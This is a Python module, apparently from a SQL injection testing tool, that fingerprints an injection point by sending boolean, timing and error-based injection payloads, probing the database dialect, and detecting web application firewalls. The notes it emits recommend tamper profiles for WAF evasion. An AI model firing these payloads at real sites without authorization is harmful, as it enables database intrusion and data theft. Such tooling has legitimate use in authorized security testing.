"""Heuristic fingerprinting of an injection point's technique/detector.

Runs entirely as an explicit pre-flight step (see ``config.fingerprint``) --
never silently inside ``build_attack_engine``, which stays I/O-free. Tries,
in order, a boolean signal, then a timing signal, then an explicit error
signal, mirroring the order most web targets actually expose them. Every
candidate is checked twice, independently, before being trusted -- the same
discipline ``BlindTechnique.probe()``/``confirm()`` already applies -- and
the result always carries an explicit ``confidence`` instead of silently
guessing. ``confidence="none"`` means exactly that: nothing distinguishable
was found, and the caller should not auto-configure anything from it.
"""

import dataclasses
import difflib
import hashlib
import logging
import re
import time
from collections.abc import Callable
from dataclasses import dataclass, field

from models.http import HttpResponseData, RequestData
from payloads import BooleanPayloadBuilder, TimePayloadBuilder
from payloads.contracts import InjectionPoint, PayloadBuilder
from transport import HttpClient


logger = logging.getLogger(__name__)


_ERROR_SIGNATURES: dict[str, str] = {
    "oracle": r"ORA-\d{5}",
    "postgres": r"(syntax error at or near|invalid input syntax)",
    "mysql": r"you have an error in your sql syntax",
    "mssql": r"(incorrect syntax near|unclosed quotation mark)",
    "sqlite": r'(unrecognized token|near ".*": syntax error)',
}

_TIME_DIALECTS: tuple[str, ...] = ("mysql", "postgres")

_MALFORMED_CONDITION = "1=(SELECT 1 FROM"

_DIALECT_PROBES: dict[str, str] = {
    "postgres": "1=(SELECT 1 FROM pg_catalog.pg_database LIMIT 1)",
    "mysql": "1=(SELECT 1 FROM information_schema.tables WHERE table_schema=database() LIMIT 1)",
    "oracle": "1=(SELECT 1 FROM v$version WHERE ROWNUM=1)",
}

_PAYLOAD_SHAPES: tuple[tuple[str, str], ...] = (
    ("' AND (", ")--"),        # string with single quote (default)
    ("' AND ", "--"),           # string without parens
    (" AND (", ")--"),         # numeric context (no quote)
    ('" AND (', ")--"),        # double-quoted string
    ("') AND (", ")--"),       # parenthesized query
)

_WAF_STATUS_CODES = frozenset({403, 406, 429, 503})

_WAF_HEADERS: dict[str, str] = {
    "cf-ray": "Cloudflare",
    "x-sucuri-id": "Sucuri",
    "x-cdn": "CDN/WAF",
    "server": "cloudflare",
}

_WAF_BODY_SIGNATURES: tuple[tuple[str, str], ...] = (
    ("access denied", "WAF block"),
    ("forbidden", "WAF block"),
    ("rate limit", "Rate limiting"),
    ("blocked", "WAF block"),
    ("security check", "WAF challenge"),
    ("captcha", "WAF challenge"),
    ("attention required", "Cloudflare challenge"),
)

_DYNAMIC_TOKEN_PATTERN = re.compile(
    r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"  # UUID
    r"|[0-9a-f]{32,64}"  # hex tokens (CSRF, session)
    r"|\d{10,13}"  # unix timestamps
    r"|nonce=['\"][^'\"]+['\"]",
    re.IGNORECASE,
)


@dataclass(frozen=True, slots=True)
class FingerprintResult:
    """What the fingerprinter believes about one injection point."""

    technique: str | None = None
    detector: str | None = None
    attack_mode: str | None = None
    detector_value: str | None = None
    expected_length: int | None = None
    expected_status: int | None = None
    error_regex: str | None = None
    dialect: str | None = None
    sleep_seconds: float | None = None
    timing_threshold: float | None = None
    confidence: str = "none"
    notes: tuple[str, ...] = ()
    waf_detected: bool = False
    payload_shape: tuple[str, str] | None = None


@dataclass(frozen=True, slots=True)
class BaselineSnapshot:
    """Captured response from a clean (no-payload) request to the target."""
    status_code: int
    content_length: int
    body_hash: str
    headers: dict[str, str] = field(default_factory=dict)


def _find_distinguishing_signal(true_text: str, false_text: str, *, min_length: int = 4) -> str | None:
    """Find a stable text fragment present in true_text but absent from false_text.

    Uses difflib to extract actual diffs instead of splitting by spaces,
    then filters out dynamic tokens (UUIDs, timestamps, hex strings) that
    would be unreliable as a detection signal.
    """
    if true_text == false_text:
        return None

    clean_true = _DYNAMIC_TOKEN_PATTERN.sub("", true_text)
    clean_false = _DYNAMIC_TOKEN_PATTERN.sub("", false_text)

    if clean_true == clean_false:
        return None

    matcher = difflib.SequenceMatcher(None, clean_false, clean_true, autojunk=False)
    ratio = matcher.ratio()

    if ratio > 0.999:
        return None

    candidates: list[str] = []
    for tag, _i1, _i2, j1, j2 in matcher.get_opcodes():
        if tag in ("insert", "replace"):
            block = clean_true[j1:j2].strip()
            if len(block) >= min_length:
                candidates.append(block)

    for candidate in sorted(candidates, key=len, reverse=True):
        if candidate in true_text and candidate not in false_text:
            return candidate

    for word in sorted(set(true_text.split()), key=len, reverse=True):
        if len(word) >= min_length and word not in false_text:
            return word

    return None


# Keep the old name available for backwards compatibility in tests
_find_distinguishing_word = _find_distinguishing_signal


def _signal_holds(
    kind: str, value: object, true_response: HttpResponseData, false_response: HttpResponseData
) -> bool:
    if kind == "status":
        return true_response.status_code == value and false_response.status_code != value
    if kind == "length":
        return true_response.content_length != false_response.content_length
    return isinstance(value, str) and value in true_response.text and value not in false_response.text


def _detect_waf(
    baseline: BaselineSnapshot | None,
    responses: list[HttpResponseData],
) -> tuple[bool, list[str]]:
    """Check if responses show signs of WAF interference.

    Returns (detected, reasons).
    """
    if not responses:
        return False, []

    reasons: list[str] = []

    for resp in responses:
        if resp.status_code in _WAF_STATUS_CODES:
            if baseline is None or baseline.status_code not in _WAF_STATUS_CODES:
                reasons.append(f"probe returned HTTP {resp.status_code} (possible WAF block)")
                break

    header_found = False
    for resp in responses:
        headers_lower = {k.lower(): v for k, v in (resp.headers or {}).items()}
        for header_key, waf_name in _WAF_HEADERS.items():
            if header_key in headers_lower:
                reasons.append(f"detected {waf_name} header: {header_key}")
                header_found = True
                break
        if header_found:
            break

    body_found = False
    for resp in responses:
        body_lower = resp.text.lower()
        for signature, label in _WAF_BODY_SIGNATURES:
            if signature in body_lower:
                reasons.append(f"response body contains '{signature}' ({label})")
                body_found = True
                break
        if body_found:
            break

    if baseline is not None and len(responses) >= 2:
        all_same = all(
            r.status_code == responses[0].status_code
            and r.content_length == responses[0].content_length
            for r in responses[1:]
        )
        differ_from_baseline = (
            responses[0].status_code != baseline.status_code
            or abs(responses[0].content_length - baseline.content_length) > 50
        )
        if all_same and differ_from_baseline:
            reasons.append(
                "all probe responses are identical to each other but differ from the "
                "clean baseline — payloads may be blocked uniformly"
            )

    return bool(reasons), reasons


class TechniqueFingerprinter:
    """Probe one injection point to recommend a technique/detector."""

    def __init__(
        self,
        *,
        http_client: HttpClient,
        injection_point: InjectionPoint,
        base_request: RequestData,
        probe_sleep_seconds: float = 1.5,
        delay: float = 0.0,
        sleeper: Callable[[float], None] = time.sleep,
    ) -> None:
        if probe_sleep_seconds <= 0:
            raise ValueError("probe_sleep_seconds must be greater than zero")
        if delay < 0:
            raise ValueError("delay cannot be negative")
        self._http_client = http_client
        self._injection_point = injection_point
        self._base_request = base_request
        self._probe_sleep_seconds = probe_sleep_seconds
        self._delay = delay
        self._sleeper = sleeper
        self._baseline: BaselineSnapshot | None = None
        self._probe_responses: list[HttpResponseData] = []

    def run(self) -> FingerprintResult:
        """Try baseline, then boolean (with multiple shapes), time, error."""
        self._baseline = self._get_baseline()
        self._probe_responses = []

        for phase in (self._try_boolean, self._try_time, self._try_error):
            result = phase()
            if result is not None:
                waf_detected, waf_reasons = _detect_waf(self._baseline, self._probe_responses)
                if waf_detected:
                    notes = list(result.notes)
                    notes.append("WAF detected: " + "; ".join(waf_reasons))
                    notes.append("consider using --tamper/--tamper-profile for evasion")
                    result = dataclasses.replace(
                        result, notes=tuple(notes), waf_detected=True
                    )
                return result

        waf_detected, waf_reasons = _detect_waf(self._baseline, self._probe_responses)
        notes = ["no distinguishable oracle found"]
        if waf_detected:
            notes.append("WAF detected: " + "; ".join(waf_reasons))
            notes.append("the WAF may be blocking payloads — try --tamper/--tamper-profile")
        return FingerprintResult(
            confidence="none",
            notes=tuple(notes),
            waf_detected=waf_detected,
        )

    def _get_baseline(self) -> BaselineSnapshot | None:
        """Send one clean request (no payload) to capture the normal response."""
        try:
            response = self._http_client.send(self._base_request)
            if self._delay:
                self._sleeper(self._delay)
            body_hash = hashlib.md5(response.text.encode("utf-8", errors="replace")).hexdigest()
            return BaselineSnapshot(
                status_code=response.status_code,
                content_length=response.content_length,
                body_hash=body_hash,
                headers={k.lower(): v for k, v in (response.headers or {}).items()},
            )
        except Exception:
            logger.debug("Baseline request failed; continuing without baseline")
            return None

    def _send(self, payload_builder: PayloadBuilder, condition: str) -> HttpResponseData:
        payload = payload_builder.build(condition)
        request = self._injection_point.inject(self._base_request, payload)
        response = self._http_client.send(request)
        self._probe_responses.append(response)
        if self._delay:
            self._sleeper(self._delay)
        return response

    def _boolean_pair(
        self, payload_builder: PayloadBuilder
    ) -> tuple[HttpResponseData, HttpResponseData]:
        true_response = self._send(payload_builder, "1=1")
        false_response = self._send(payload_builder, "1=2")
        return true_response, false_response

    def _try_boolean(self) -> FingerprintResult | None:
        for prefix, suffix in _PAYLOAD_SHAPES:
            builder = BooleanPayloadBuilder(prefix=prefix, suffix=suffix)
            result = self._try_boolean_with_builder(builder, (prefix, suffix))
            if result is not None:
                return result
        return None

    def _try_boolean_with_builder(
        self, builder: PayloadBuilder, shape: tuple[str, str]
    ) -> FingerprintResult | None:
        true_response, false_response = self._boolean_pair(builder)

        if true_response.status_code != false_response.status_code:
            kind, value = "status", true_response.status_code
        elif true_response.content_length != false_response.content_length:
            kind, value = "length", true_response.content_length
        else:
            word = _find_distinguishing_signal(true_response.text, false_response.text)
            if word is None:
                return None
            kind, value = "text", word

        second_true, second_false = self._boolean_pair(builder)
        confirmed = _signal_holds(kind, value, second_true, second_false)

        notes = [f"boolean oracle distinguished by {kind}"]
        if shape != _PAYLOAD_SHAPES[0]:
            notes.append(f"payload shape: prefix={shape[0]!r} suffix={shape[1]!r}")

        dialect = self._detect_dialect(builder, kind, value, false_response)
        if dialect is not None:
            notes.append(f"dialect probed as {dialect}")

        kwargs: dict[str, object] = {
            "technique": "boolean",
            "attack_mode": "conditional-response",
            "dialect": dialect,
            "confidence": "confirmed" if confirmed else "probable",
            "notes": tuple(notes),
            "payload_shape": shape,
        }
        if kind == "status":
            kwargs.update(detector="status", expected_status=value)
        elif kind == "length":
            kwargs.update(detector="length", expected_length=value)
        else:
            kwargs.update(detector="text", detector_value=value)
        return FingerprintResult(**kwargs)

    def _detect_dialect(
        self, builder: PayloadBuilder, kind: str, value: object, false_response: HttpResponseData
    ) -> str | None:
        for dialect, probe in _DIALECT_PROBES.items():
            response = self._send(builder, probe)
            if _signal_holds(kind, value, response, false_response):
                return dialect
        return None

    def _try_time(self) -> FingerprintResult | None:
        threshold = self._probe_sleep_seconds * 0.7
        for dialect in _TIME_DIALECTS:
            builder = TimePayloadBuilder.for_dialect(dialect, self._probe_sleep_seconds)
            true_response, false_response = self._boolean_pair(builder)
            if true_response.elapsed_seconds - false_response.elapsed_seconds < threshold:
                continue

            second_true, second_false = self._boolean_pair(builder)
            confirmed = second_true.elapsed_seconds - second_false.elapsed_seconds >= threshold
            return FingerprintResult(
                technique="time",
                detector="timing",
                attack_mode="conditional-response",
                dialect=dialect,
                sleep_seconds=self._probe_sleep_seconds,
                timing_threshold=threshold,
                confidence="confirmed" if confirmed else "probable",
                notes=(f"timing oracle responded to the {dialect} sleep syntax",),
            )
        return None

    def _try_error(self) -> FingerprintResult | None:
        builder = BooleanPayloadBuilder()
        response = self._send(builder, _MALFORMED_CONDITION)

        for dialect, pattern in _ERROR_SIGNATURES.items():
            if not re.search(pattern, response.text, re.IGNORECASE):
                continue

            second = self._send(builder, _MALFORMED_CONDITION)
            confirmed = bool(re.search(pattern, second.text, re.IGNORECASE))

            if dialect == "oracle":
                return FingerprintResult(
                    technique="boolean",
                    detector="error",
                    attack_mode="conditional-error",
                    error_regex=pattern,
                    dialect=dialect,
                    confidence="confirmed" if confirmed else "probable",
                    notes=(f"error signature matched for dialect={dialect}",),
                )

            suggestion = (
                "try --technique visible-error manually (needs a matching "
                "--error-value-regex for this target's exact error text)"
                if dialect == "postgres"
                else "error-based extraction for this dialect isn't implemented yet"
            )
            return FingerprintResult(
                confidence="none",
                dialect=dialect,
                notes=(
                    f"error signature matched for dialect={dialect}, but {suggestion}",
                ),
            )
        return None
